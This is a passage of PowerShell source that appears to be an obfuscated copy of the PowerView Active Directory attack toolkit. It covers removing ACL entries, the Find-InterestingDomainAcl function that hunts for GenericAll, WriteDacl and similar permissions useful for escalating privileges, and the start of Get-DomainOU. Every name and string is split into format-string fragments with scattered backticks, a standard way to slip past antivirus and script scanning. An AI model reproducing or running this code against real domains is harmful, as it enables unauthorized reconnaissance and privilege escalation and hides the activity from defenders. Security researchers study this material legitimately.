                &("{2}{0}{1}" -f 'e-Ver','bose','Writ') "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) "

                try {
                    ${ID`Ent`ITy} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${pRiNCIpalo`B`j`E`ct}."OBj`E`cTSid")

                    if (${g`UIDS}) {
                        ForEach (${gU`id} in ${GU`Ids}) {
                            ${ne`wG`UId} = &("{0}{2}{1}"-f 'N','ct','ew-Obje') ("{1}{0}"-f 'uid','G') ${g`Uid}
                            ${AdRi`Gh`TS} = [System.DirectoryServices.ActiveDirectoryRights] ("{1}{2}{0}{3}"-f'ndedR','Ext','e','ight')
                            ${Ac`eS} += &("{1}{2}{0}{3}" -f'bjec','New','-O','t') ("{1}{3}{5}{2}{4}{0}{6}{7}{8}" -f 'DirectorySer','S','m','ys','.','te','vices.ActiveDirectoryAccessR','u','le') ${ideN`Ti`Ty}, ${adRI`gH`Ts}, ${CO`NT`ROLType}, ${NEw`g`UID}, ${iNh`e`Rit`ANcETY`PE}
                        }
                    }
                    else {
                        
                        ${Ad`Ri`Ghts} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{1}{0}"-f 'All','neric','Ge')
                        ${Ac`eS} += &("{3}{0}{1}{2}" -f '-Obje','c','t','New') ("{8}{7}{3}{5}{10}{11}{1}{9}{2}{4}{6}{0}"-f'e','ces','ct','c','or','to','yAccessRul','ire','System.D','.ActiveDire','rySe','rvi') ${ID`eNtItY}, ${AdRI`gH`Ts}, ${COnTr`olty`Pe}, ${I`NhEritan`c`e`T`Ype}
                    }

                    
                    ForEach (${A`ce} in ${a`CEs}) {
                        &("{0}{1}{2}" -f 'Wri','te-Verbos','e') "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${TaR`Getent`RY} = ${Ta`R`Ge`TOBjE`ct}.("{0}{3}{1}{2}{4}" -f 'GetDi','ryE','n','recto','try').Invoke()
                        ${tar`geTe`NT`Ry}."pSb`A`SE"."Opt`i`ONs"."sEcURItYm`A`sks" = ("{1}{0}"-f 'cl','Da')
                        ${taR`geT`EntRY}."PSBA`se"."oB`JeCt`sECUrI`Ty".("{1}{0}{2}" -f'oveAcces','Rem','sRule').Invoke(${a`Ce})
                        ${Ta`Rg`E`TEnTRy}."p`SbA`Se".("{2}{0}{1}{3}"-f't','Cha','Commi','nges').Invoke()
                    }
                }
                catch {
                    &("{2}{1}{4}{0}{3}" -f 's','te-','Wri','e','Verbo') "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function fiND-I`NtErEs`T`i`NGdOmAi`NACl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{1}" -f 'houl','ss','PSS','dProce'}, '')]
    [OutputType({"{1}{0}{2}{3}"-f'erV','Pow','iew.','ACL'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOSItiOn = 0, vaLUefromPIpElIne = ${Tr`Ue}, VaLueFRoMpIpELiNEbYpROPerTYName = ${tR`Ue})]
        [Alias({"{2}{1}{0}"-f'me','omainNa','D'}, {"{1}{0}"-f'me','Na'})]
        [String]
        ${DOma`in},

        [Switch]
        ${R`ES`olVeg`UiDS},

        [String]
        [ValidateSet('All', {"{0}{1}{2}" -f 'ResetPas','swor','d'}, {"{1}{2}{0}{3}" -f'e','Write','M','mbers'})]
        ${r`I`gHtsfiLTER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'lter','Fi'})]
        [String]
        ${lDa`p`FiLt`er},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'A','DSPath'})]
        [String]
        ${se`ARc`HbasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{2}{4}"-f't','Doma','roll','inCon','er'})]
        [String]
        ${sERv`ER},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{0}{2}{1}" -f 'On','evel','eL'}, {"{0}{1}"-f'Sub','tree'})]
        [String]
        ${se`Arc`HSCOPE} = ("{1}{0}" -f'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSul`TpA`ge`s`iZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRv`ErtI`mEl`IMiT},

        [Switch]
        ${Tom`B`st`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Red`EnTIAl} =  ${7Tq02}::"eMp`TY"
    )

    BEGIN {
        ${A`cla`Rg`U`MENts} = @{}
        if (${Ps`BOU`NdPARAm`EteRs}[("{1}{2}{0}"-f'Ds','Reso','lveGUI')]) { ${A`cl`A`RGumENtS}[("{0}{1}{2}" -f 'R','esolveGUI','Ds')] = ${ReS`OL`VEGuiDs} }
        if (${Ps`B`ouND`PaR`A`MetErs}[("{0}{2}{3}{1}"-f'Ri','lter','ght','sFi')]) { ${Acl`ARg`UMeNTs}[("{1}{2}{0}" -f 'htsFilter','Ri','g')] = ${rI`GHt`SFi`lteR} }
        if (${PSBO`U`ND`paRAmEteRs}[("{0}{2}{1}"-f 'LDAPF','r','ilte')]) { ${A`cLa`RGUMe`NTs}[("{1}{2}{0}"-f'APFilter','L','D')] = ${lD`APfIL`TEr} }
        if (${p`Sb`oun`dP`A`RamEtErS}[("{1}{2}{0}" -f 'ase','Sear','chB')]) { ${acLA`RGu`me`NTS}[("{1}{0}{2}"-f'c','Sear','hBase')] = ${S`EA`RChB`ASe} }
        if (${p`SBOu`N`DpARAmEt`ERS}[("{0}{2}{1}" -f'S','rver','e')]) { ${Ac`laR`g`Um`enTS}[("{1}{0}"-f 'erver','S')] = ${seRv`er} }
        if (${p`sBO`UNDpaRa`mEtE`RS}[("{2}{0}{1}{3}" -f'r','ch','Sea','Scope')]) { ${aclaR`guMe`N`Ts}[("{0}{2}{1}"-f'Se','Scope','arch')] = ${sE`ARCHsc`o`Pe} }
        if (${pSbOun`DPa`RameT`Ers}[("{0}{1}{2}"-f'ResultP','age','Size')]) { ${aCl`ARgU`mE`NtS}[("{2}{1}{0}" -f'ltPageSize','su','Re')] = ${R`ESU`lTpa`gESI`zE} }
        if (${Ps`BouN`d`PAR`AmE`TERs}[("{0}{1}{2}" -f 'Server','TimeLimi','t')]) { ${acLAR`GU`m`en`Ts}[("{0}{2}{1}{3}"-f 'Serve','Lim','rTime','it')] = ${SeR`Ver`T`IM`eLImIT} }
        if (${P`SBOU`NdPAraMeT`ErS}[("{1}{0}" -f'ne','Tombsto')]) { ${aCl`ArguMen`Ts}[("{2}{1}{0}" -f 'stone','b','Tom')] = ${t`Om`Bst`ONE} }
        if (${PSBOun`DP`ARA`MeT`ErS}[("{2}{1}{0}" -f 'ential','red','C')]) { ${AC`L`ArG`UMEnTS}[("{0}{3}{2}{1}" -f'C','tial','en','red')] = ${c`R`EdEnt`IaL} }

        ${O`B`jECtsEA`R`CHERa`RGUmeNTS} = @{
            ("{1}{2}{0}" -f 'ties','Prop','er') = ("{4}{6}{7}{3}{5}{0}{1}{2}" -f'l','a','ss','m','sa','e,objectc','mac','countna')
            'Raw' = ${Tr`UE}
        }
        if (${PSb`OUn`DPaRa`m`ETeRs}[("{0}{1}"-f 'Serv','er')]) { ${obje`ctS`E`A`Rc`h`ER`ARGUmENTS}[("{1}{0}"-f 'r','Serve')] = ${S`ERV`Er} }
        if (${ps`B`oUnDpA`RAmEtERS}[("{0}{3}{1}{2}" -f 'S','arch','Scope','e')]) { ${Objects`EaR`chER`Ar`GUm`eNts}[("{2}{3}{1}{0}"-f'e','rchScop','Se','a')] = ${S`Ea`R`CHscoPe} }
        if (${PSBOuNdP`A`RaMeTe`Rs}[("{3}{0}{1}{2}"-f 'P','ageSiz','e','Result')]) { ${object`S`ea`R`C`HerArg`Uments}[("{1}{2}{4}{0}{3}" -f'PageSiz','R','e','e','sult')] = ${rEsUl`TP`Ages`IzE} }
        if (${PS`B`oUnDParAM`ETeRS}[("{0}{2}{1}" -f 'Serve','imeLimit','rT')]) { ${o`BJE`ctSearCH`Era`RGU`MenTs}[("{1}{2}{3}{0}"-f't','Server','TimeL','imi')] = ${sERv`ER`TIMeL`ImiT} }
        if (${PSBO`UNDpa`RAMETE`Rs}[("{3}{1}{2}{0}"-f 'e','omb','ston','T')]) { ${ObJecT`sEa`R`CHEra`RGuMenTs}[("{0}{2}{1}"-f 'Tom','tone','bs')] = ${tOM`BSTo`NE} }
        if (${PsBoU`NDpaR`Am`ETE`RS}[("{3}{1}{2}{0}"-f 'tial','r','eden','C')]) { ${ObJeCT`SEa`RC`h`E`RaRguMenTS}[("{0}{2}{1}" -f'Crede','l','ntia')] = ${cRe`DENT`I`AL} }

        ${A`DnAm`Ea`RGUMen`Ts} = @{}
        if (${pS`BOun`DpaRaMe`T`E`Rs}[("{1}{0}"-f'r','Serve')]) { ${Ad`NA`MeArGU`MENts}[("{0}{1}" -f 'Serv','er')] = ${s`ervER} }
        if (${ps`B`ou`N`dParAM`ETERs}[("{1}{2}{0}" -f 'l','Crede','ntia')]) { ${adN`A`MEaRguMENts}[("{1}{2}{0}"-f 'ntial','Cre','de')] = ${crE`den`Ti`Al} }

        
        ${ReSOLV`e`dSi`dS} = @{}
    }

    PROCESS {
        if (${pS`BO`UNDP`ARa`M`eTErS}[("{0}{1}"-f'D','omain')]) {
            ${aCLARgU`MeN`Ts}[("{0}{1}" -f 'Domai','n')] = ${D`OMAiN}
            ${aDNAmear`GUmEn`TS}[("{0}{1}" -f 'Domai','n')] = ${Dom`AIn}
        }

        &("{4}{3}{1}{0}{5}{2}" -f 'c','Obje','cl','Domain','Get-','tA') @ACLArguments | &("{1}{2}{0}" -f 'rEach-Object','F','o') {

            if ( (${_}."ACTivEd`iR`e`ctORYRiG`H`TS" -match ((("{1}{6}{10}{5}{2}{4}{0}{9}{8}{3}{7}" -f'6Cre','G','Allyl6Write','D','yl','c','en','elete','6','ateyl','eri'))."RE`pL`Ace"(([cHAr]121+[cHAr]108+[cHAr]54),'|'))) -or ((${_}."ACti`VedI`R`e`CToryriG`hTS" -match ("{2}{0}{1}"-f 'tended','Right','Ex')) -and (${_}."a`C`equAl`IfIer" -match ("{0}{1}"-f 'Allo','w')))) {
                
                if (${_}."S`eC`Ur`itYIDenTi`Fi`eR"."Va`lUE" -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if (${R`Es`Ol`V`EdSIDs}[${_}."sECurIt`yi`DEnTIFI`er"."vAL`Ue"]) {
                        ${ID`EN`TiTyReFerENce`Name}, ${I`DENti`TyrE`FeRenceD`OMaIn}, ${Id`en`TI`T`y`RefERENc`Edn}, ${iDEN`TiT`Yr`EF`e`R`EnCECLASs} = ${RESolveD`SI`Ds}[${_}."S`ec`U`RITYiDeNTIF`Ier"."Val`Ue"]

                        ${IN`TeR`Esti`Nga`cL} = &("{1}{0}{2}" -f'e','New-Obj','ct') ("{2}{1}{0}"-f't','c','PSObje')
                        ${iN`TerEsTI`NG`Acl} | &("{2}{0}{1}"-f'd-Mem','ber','Ad') ("{0}{1}{2}" -f 'NotePr','o','perty') ("{1}{0}" -f 'bjectDN','O') ${_}."ob`jectdn"
                        ${inT`EREsT`IngACL} | &("{2}{0}{1}"-f 'e','r','Add-Memb') ("{0}{2}{1}{3}"-f'N','pert','otePro','y') ("{0}{1}{2}"-f'Ace','Qualifie','r') ${_}."aCequA`LI`Fier"
                        ${in`T`E`R`EstIngACl} | &("{1}{2}{3}{0}"-f 'ember','A','dd-','M') ("{3}{0}{1}{2}"-f'per','t','y','NotePro') ("{2}{3}{1}{4}{5}{0}" -f 's','iveDirec','A','ct','tory','Right') ${_}."ac`TiVedi`REC`TORyRIg`HtS"
                        if (${_}."OBj`ect`A`cETyPe") {
                            ${inT`ERES`Ting`ACl} | &("{2}{1}{0}" -f'er','d-Memb','Ad') ("{0}{2}{1}"-f 'NoteProp','rty','e') ("{2}{3}{0}{1}" -f 'ctAceTy','pe','Obj','e') ${_}."ObjeCtaCeT`Y`pE"
                        }
                        else {
                            ${InTErEsTI`NGA`cL} | &("{0}{2}{3}{1}" -f'Ad','r','d-M','embe') ("{3}{2}{0}{1}"-f 'opert','y','ePr','Not') ("{0}{2}{3}{1}"-f 'O','e','bjectAceTy','p') ("{1}{0}" -f'ne','No')
                        }
                        ${IN`T`ErEsTINGa`Cl} | &("{0}{1}{2}" -f'A','dd','-Member') ("{1}{0}{2}{3}"-f 'eProp','Not','ert','y') ("{2}{0}{1}"-f 'g','s','AceFla') ${_}."acEFLA`Gs"
                        ${iNT`ErEs`TiNg`ACL} | &("{2}{1}{0}"-f 'r','mbe','Add-Me') ("{3}{0}{2}{1}"-f 'rope','y','rt','NoteP') ("{1}{0}" -f 'ceType','A') ${_}."Acety`pe"
                        ${in`TERe`S`TiNgacL} | &("{2}{1}{0}" -f 'r','Membe','Add-') ("{1}{3}{0}{2}" -f 't','NoteP','y','roper') ("{0}{3}{4}{2}{1}" -f 'I','ceFlags','tan','nh','eri') ${_}."iN`HERi`TANcefl`AGS"
                        ${in`TE`RE`ST`InGAcl} | &("{0}{1}{2}" -f 'A','dd-Mem','ber') ("{2}{3}{0}{1}" -f 'o','perty','NoteP','r') ("{2}{0}{1}{5}{3}{4}" -f'cu','r','Se','tyIdentifi','er','i') ${_}."s`EC`URI`TyiDeNTiFi`ER"
                        ${INTER`ESTinG`A`cl} | &("{0}{1}{2}"-f 'Add-','Membe','r') ("{3}{1}{2}{0}" -f'Property','o','te','N') ("{2}{4}{1}{3}{0}{5}" -f'Nam','tyRefere','I','nce','denti','e') ${ideNt`iTyR`e`F`eR`EnCEnaMe}
                        ${IN`TErE`S`TINgACL} | &("{0}{2}{1}" -f 'Add-M','mber','e') ("{1}{2}{0}{3}" -f'ert','No','teProp','y') ("{3}{0}{2}{1}"-f 'entity','eDomain','Referenc','Id') ${i`DEnt`it`YRe`FErenc`EDOmaIn}
                        ${iN`Te`REsT`iNG`AcL} | &("{1}{0}{2}{3}" -f 'm','Add-Me','b','er') ("{3}{2}{0}{1}" -f'ePropert','y','t','No') ("{4}{5}{1}{2}{3}{0}" -f 'nceDN','tityR','ef','ere','Id','en') ${IDeNtiTyrE`FeReN`C`Edn}
                        ${INt`eRE`S`TINGa`cL} | &("{3}{0}{2}{1}" -f'em','r','be','Add-M') ("{1}{0}{2}"-f'otePrope','N','rty') ("{4}{5}{1}{2}{0}{3}"-f 'ren','Re','fe','ceClass','Identi','ty') ${i`dENtIty`Re`FERenCEc`l`AsS}
                        ${I`NTER`estiNGacl}
                    }
                    else {
                        ${IDE`Nt`itYRE`FEren`cEdN} = &("{0}{1}{2}"-f'C','onvert-ADN','ame') -Identity ${_}."sE`CURIt`YiDEN`TIFier"."V`AlUe" -OutputType ('DN') @ADNameArguments
                        

                        if (${IDeN`TITyr`EF`E`ReNC`Edn}) {
                            ${I`d`EnT`ITY`RE`FER`ENC`EDomAiN} = ${iD`entiTyr`EF`er`EnCE`dn}.("{2}{0}{1}"-f 'Str','ing','Sub').Invoke(${idenTi`TYrefe`Re`NcE`DN}.("{2}{0}{1}"-f 'ndexO','f','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            
                            ${O`Bj`EC`TSeARchEra`RGumeNTS}[("{1}{0}" -f'omain','D')] = ${iDE`NtI`TyrefEreNc`eDO`MAIn}
                            ${o`BJeCTsEA`RCH`erarGu`m`EntS}[("{2}{0}{1}"-f't','y','Identi')] = ${IdEn`Tit`yRE`FE`REn`cEdn}
                            
                            ${o`BJ`ECT} = &("{0}{1}{3}{2}" -f 'Ge','t-Do','ect','mainObj') @ObjectSearcherArguments

                            if (${O`BJ`EcT}) {
                                ${IdeNTITy`ReFeRE`NC`EN`AMe} = ${OB`j`ect}."p`ROPE`RTies"."SaMa`ccou`Ntna`mE"[0]
                                if (${OB`j`ECT}."P`RoPE`RTies"."oBjEc`T`cl`AsS" -match ("{1}{0}"-f'puter','com')) {
                                    ${idE`N`TITYreFERE`N`C`e`ClAss} = ("{2}{1}{0}"-f'ter','u','comp')
                                }
                                elseif (${O`B`jECt}."prO`Pe`RTi`es"."OBjEc`TcLA`ss" -match ("{0}{1}"-f 'gro','up')) {
                                    ${iDEntIT`Yref`EReN`cEclass} = ("{0}{1}"-f'gr','oup')
                                }
                                elseif (${OB`jeCt}."PR`opE`RtieS"."oB`JeC`TclAss" -match ("{1}{0}"-f'ser','u')) {
                                    ${IDEn`TITYREFErE`Nc`e`c`LaSs} = ("{0}{1}"-f'u','ser')
                                }
                                else {
                                    ${iD`EN`TItY`R`e`F`erEncEcLASS} = ${NU`Ll}
                                }

                                
                                ${REsO`LV`E`dSIDS}[${_}."sE`c`URiTY`IDEN`T`IfIer"."Va`luE"] = ${idEntI`T`YRe`FeREnCENAMe}, ${id`EnTIty`R`EF`ErenCEDoMAIN}, ${IDeNt`iT`yr`EFEre`NC`EDn}, ${Id`eNtI`TYReF`EREnceClass}

                                ${inTe`Res`T`INGa`Cl} = &("{1}{2}{0}"-f'ect','Ne','w-Obj') ("{0}{1}"-f 'PS','Object')
                                ${iN`TER`e`STinGa`Cl} | &("{1}{2}{0}{3}"-f 'd-Memb','A','d','er') ("{1}{0}{3}{2}"-f 'otePrope','N','y','rt') ("{1}{2}{0}" -f'DN','Obje','ct') ${_}."Objec`TDN"
                                ${I`NtE`REStiNg`Acl} | &("{1}{0}{2}" -f 'd-','Ad','Member') ("{1}{3}{2}{0}"-f'rty','NotePr','pe','o') ("{0}{1}{2}" -f 'AceQua','lifi','er') ${_}."ACeQUA`L`I`FIER"
                                ${int`eRes`TinG`ACl} | &("{2}{0}{1}"-f 'Membe','r','Add-') ("{2}{0}{1}" -f 'ePro','perty','Not') ("{5}{0}{1}{4}{3}{2}" -f 'ti','v','yRights','Director','e','Ac') ${_}."ACtiV`edIreC`To`RyriGh`Ts"
                                if (${_}."ob`JECtA`C`etyPE") {
                                    ${iN`T`eRe`StinGACl} | &("{1}{2}{0}" -f'er','Add-Mem','b') ("{0}{2}{1}" -f 'NotePr','erty','op') ("{1}{2}{3}{0}" -f 'e','Obj','ec','tAceTyp') ${_}."Ob`je`CTAcET`Ype"
                                }
                                else {
                                    ${inte`R`ESTIngaCL} | &("{3}{0}{2}{1}"-f 'dd-','mber','Me','A') ("{1}{2}{3}{0}"-f'Property','N','o','te') ("{3}{2}{0}{1}"-f 'T','ype','e','ObjectAc') ("{1}{0}" -f'one','N')
                                }
                                ${INTErest`IN`Gacl} | &("{0}{2}{1}{3}" -f 'A','em','dd-M','ber') ("{1}{2}{3}{0}"-f 'erty','N','oteP','rop') ("{0}{1}{2}" -f'Ace','Fl','ags') ${_}."aC`EFl`AGs"
                                ${inTE`Re`stiN`GacL} | &("{2}{1}{3}{0}"-f'r','M','Add-','embe') ("{0}{2}{1}"-f'NoteP','perty','ro') ("{1}{0}" -f'e','AceTyp') ${_}."ACet`Y`pE"
                                ${I`Nte`RE`stingacl} | &("{1}{3}{0}{2}"-f 'b','Ad','er','d-Mem') ("{3}{1}{0}{2}" -f 't','per','y','NotePro') ("{5}{4}{1}{2}{0}{3}"-f 'F','er','itance','lags','nh','I') ${_}."INhE`RiTAn`cEf`LA`GS"
                                ${INtEreS`T`i`NgaCl} | &("{1}{0}{2}" -f '-Memb','Add','er') ("{0}{3}{1}{2}"-f'No','eP','roperty','t') ("{2}{3}{1}{0}" -f'r','e','Sec','urityIdentifi') ${_}."s`EcU`RITYIDEn`TiFieR"
                                ${InT`eRe`STiNg`ACL} | &("{2}{1}{0}"-f'er','-Memb','Add') ("{0}{1}{2}" -f'Note','Pr','operty') ("{1}{0}{2}{3}"-f 't','Identi','yReferenceNam','e') ${iDENtIt`y`REFe`R`E`N`ceNaMe}
                                ${I`N`TEReStIng`Acl} | &("{1}{0}{2}"-f '-Mem','Add','ber') ("{2}{3}{0}{1}"-f 'rt','y','NoteP','rope') ("{4}{2}{5}{1}{0}{3}{6}" -f 'eDom','renc','ent','ai','Id','ityRefe','n') ${IDEntITYrEF`EREnc`e`D`om`A`iN}
                                ${INT`ERest`ingA`cl} | &("{1}{0}{2}"-f 'Memb','Add-','er') ("{0}{3}{2}{1}"-f 'NotePr','y','pert','o') ("{4}{3}{1}{2}{0}"-f 'eDN','ityRefere','nc','t','Iden') ${Iden`TI`TYR`eF`E`ReNceDN}
                                ${iNter`es`Ti`NG`ACl} | &("{1}{2}{0}" -f 'Member','Add','-') ("{0}{2}{1}"-f 'NotePrope','y','rt') ("{2}{1}{0}{4}{3}{6}{5}"-f'en','d','I','ferenc','tityRe','Class','e') ${IDEnT`i`T`Yr`EFErEncEcl`AsS}
                                ${I`NT`e`RESTINGACL}
                            }
                        }
                        else {
                            &("{0}{1}{2}{3}"-f 'Writ','e-W','arni','ng') "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName "
                        }
                    }
                }
            }
        }
    }
}


function G`E`T-dOMain`oU {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}"-f 'PSS','hould','ocess','Pr'}, '')]
    [OutputType({"{0}{1}{2}{3}"-f 'Power','View','.O','U'})]
    [CmdletBinding()]
    Param (
        [Parameter(posItion = 0, ValueFROmPIPeLiNE = ${Tr`Ue}, vaLUEFroMpiPEliNEbyPROPeRtyNAme = ${tR`Ue})]
        [Alias({"{0}{1}" -f'Nam','e'})]
        [String[]]
        ${Id`E`N`TITy},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}" -f'UID','G'})]
        ${gpL`i`NK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`O`mAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Filt','er'})]
        [String]
        ${lda`PF`ilteR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`Op`ErTIeS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'th','ADSPa'})]
        [String]
        ${sEaRcH`BA`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}" -f 'ler','ainCon','Dom','trol'})]
        [String]
        ${se`RVEr},

        [ValidateSet({"{1}{0}" -f'e','Bas'}, {"{1}{0}"-f'neLevel','O'}, {"{0}{1}"-f'Subtre','e'})]
        [String]
        ${SE`Arch`s`CopE} = ("{1}{0}"-f 'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`esuLt`pAges`I`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRve`R`TiMel`im`It},

        [ValidateSet({"{1}{0}" -f'cl','Da'}, {"{1}{0}" -f 'p','Grou'}, {"{0}{1}"-f 'N','one'}, {"{1}{0}"-f'er','Own'}, {"{1}{0}"-f 'acl','S'})]
        [String]
        ${s`ECUriTy`M`A`SkS},

        [Switch]
        ${tomb`s`TONe},

        [Alias({"{2}{0}{3}{1}" -f'rnO','e','Retu','n'})]
        [Switch]
        ${fI`NdO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`E`DENTI`Al} =  (  ITEm  ("{3}{0}{1}{2}"-f'e:7','t','q02','VAriaBL'))."vaL`Ue"::"em`PTy",

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${sEar`cHErar`gum`ENTs} = @{}
        if (${p`SBo`UndpaR`A`met`eRS}[("{0}{1}"-f 'Domai','n')]) { ${sE`Arche`Ra`RgumE`NTS}[("{1}{0}" -f'in','Doma')] = ${Do`MAin} }
        if (${psB`Ou`NdPa`RamE`TeRs}[("{0}{2}{1}" -f'Proper','s','tie')]) { ${sEArCHER`A`RGu`ME`NTS}[("{1}{0}{2}"-f'operti','Pr','es')] = ${PR`OpE`Rti`eS} }
        if (${PSbOUnDpA`R`AM`EtERs}[("{1}{2}{0}" -f 'ase','Sear','chB')]) { ${sEArCh`e`RAr`g`UmeNTS}[("{2}{0}{1}" -f 'c','hBase','Sear')] = ${SeaR`cH`B`AsE} }
        if (${psB`OUn`DPaRAme`Te`RS}[("{1}{0}" -f'er','Serv')]) { ${sEAR`CHE`RaRGU`m`Ents}[("{0}{2}{1}" -f'Se','r','rve')] = ${s`eR`VER} }
        if (${P`SBOUnDP`Aramet`e`Rs}[("{2}{0}{1}"-f'chScop','e','Sear')]) { ${seaRcherA`RgUM`e`NtS}[("{0}{2}{1}"-f'S','rchScope','ea')] = ${SE`ARch`s`coPE} }
        if (${pSBo`UNd`ParaMe`TErS}[("{0}{3}{2}{1}" -f'R','geSize','ultPa','es')]) { ${seaR`ChErAR`GuM`e`N`TS}[("{1}{0}{3}{4}{2}"-f'sultP','Re','e','age','Siz')] = ${re`s`ULtPAGe`si`ze} }
        if (${pSb`OUnd`p`A`Ram`EtErs}[("{2}{0}{1}" -f 'erve','rTimeLimit','S')]) { ${sEA`RcHEra`RgUM`E`NtS}[("{2}{3}{1}{0}"-f'TimeLimit','er','S','erv')] = ${S`E`RV`ERTiMe`lImiT} }
        if (${pSb`OU`N`Dp`ARaMETErS}[("{3}{4}{1}{0}{2}" -f's','a','ks','Secur','ityM')]) { ${sear`C`heRARGU`M`eNts}[("{2}{1}{3}{0}"-f 'ks','a','SecurityM','s')] = ${seCU`R`ItYmaskS} }
        if (${PS`BOu`ND`P`ArAMEte`RS}[("{1}{0}"-f 'stone','Tomb')]) { ${sEArc`he`R`Ar`GU`MeNTS}[("{0}{2}{1}"-f'To','tone','mbs')] = ${T`oMBs`Tone} }
        if (${P`SB`O`U`NDpAR`AmEtErs}[("{1}{0}{2}" -f 'ti','Creden','al')]) { ${S`earC`HerArGUme`NtS}[("{1}{2}{0}"-f'al','Cr','edenti')] = ${c`Re`DenTial} }
        ${oU`Se`ARChEr} = &("{2}{4}{0}{1}{3}"-f'mainSe','ar','G','cher','et-Do') @SearcherArguments
    }

    PROCESS {
        if (${OuS`EAR`CH`ER}) {
            ${idEn`T`ItY`F`IltER} = ''
            ${fi`lt`ER} = ''
            ${I`dentIty} | &("{0}{1}{2}{3}" -f'Whe','re-Obj','e','ct') {${_}} | &("{2}{3}{0}{1}{4}"-f'je','c','ForE','ach-Ob','t') {
                ${IDE`NT`ity`i`NsTAn`ce} = ${_}.("{1}{0}"-f'place','Re').Invoke('(', '\28').("{2}{0}{1}"-f'l','ace','Rep').Invoke(')', '\29')
                if (${Id`ENT`ityIN`STAnCE} -match ("{0}{2}{1}"-f '^O','.*','U=')) {
                    ${IDENtITY`FiL`T`eR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${p`SB`OUNdPa`RAMEteRS}[("{0}{2}{1}"-f 'D','n','omai')]) -and (-not ${pSBOu`ND`pa`RAM`ETERs}[("{2}{0}{1}"-f'Ba','se','Search')])) {
                        
                        
                        ${I`de`N`TItydo`MAIN} = ${iDe`Nt`ITYiNS`T`ANCe}.("{1}{0}{2}" -f 'i','SubStr','ng').Invoke(${I`D`ENtITyi`NsTance}.("{2}{1}{0}"-f 'exOf','nd','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{1}{2}" -f 'Write-','Verbo','se') ('[Get-'+'DomainOU]'+' '+'Extrac'+'ted'+' '+'do'+'main '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${Sear`chE`RAR`GUMEn`TS}[("{1}{0}" -f 'n','Domai')] = ${IDE`Nt`iTyDOmA`in}
                        ${O`UsEArc`H`ER} = &("{1}{2}{0}{3}{4}"-f'inSear','Ge','t-Doma','che','r') @SearcherArguments
                        if (-not ${O`UsEa`RC`Her}) {
                            &("{1}{2}{0}"-f 'ng','Write-War','ni') ('['+'Get'+'-Dom'+'ain'+'OU] '+'Un'+'able '+'t'+'o '+'r'+'etrie'+'ve'+' '+'doma'+'i'+'n '+'search'+'er'+' '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${gUIDb`Y`TE`ST`RiNG} = (-Join (([Guid]${IdEN`T`ItY`Ins`TaNCe}).("{2}{0}{1}" -f'teA','rray','ToBy').Invoke() | &("{3}{4}{1}{0}{2}" -f 'bj','ch-O','ect','Fo','rEa') {${_}.("{0}{1}{2}"-f'To','St','ring').Invoke('X').("{1}{0}{2}"-f 'Lef','Pad','t').Invoke(2,'0')})) -Replace ("{0}{1}" -f'(.','.)'),'\$1'
                        ${IdenT`ItYfIL`TeR} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${IDEntITyf`I`L`TeR} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${i`DeN`T`it`YFiLter} -and (${ID`En`TITyfi`Lter}.("{0}{1}" -f'Tr','im').Invoke() -ne '') ) {
                ${F`I`LTEr} += "(|$IdentityFilter)"
            }

            if (${P`s`B`OUndpAR`AMeTE`RS}[("{1}{0}"-f 'ink','GPL')]) {
                &("{2}{0}{1}{3}" -f 'ite-Ve','rbos','Wr','e') ('[Get'+'-Doma'+'inO'+'U] '+'Sea'+'rchi'+'ng '+'fo'+'r '+'OUs'+' '+'wit'+'h '+"$GPLink "+'s'+'et '+'i'+'n '+'t'+'he '+'gp'+'Link '+'p'+'ropert'+'y')
                ${F`ILT`Er} += "(gplink=*$GPLink*)"
            }

            if (${P`S`BoundP`A`RaMe`TERS}[("{1}{0}{2}" -f 'APFil','LD','ter')]) {
                &("{3}{0}{1}{2}" -f 'V','erb','ose','Write-') ('['+'Get'+'-Dom'+'ainO'+'U] '+'Usi'+'ng'+' '+'additi'+'on'+'al '+'LDA'+'P '+'fi'+'lt'+'er: '+"$LDAPFilter")
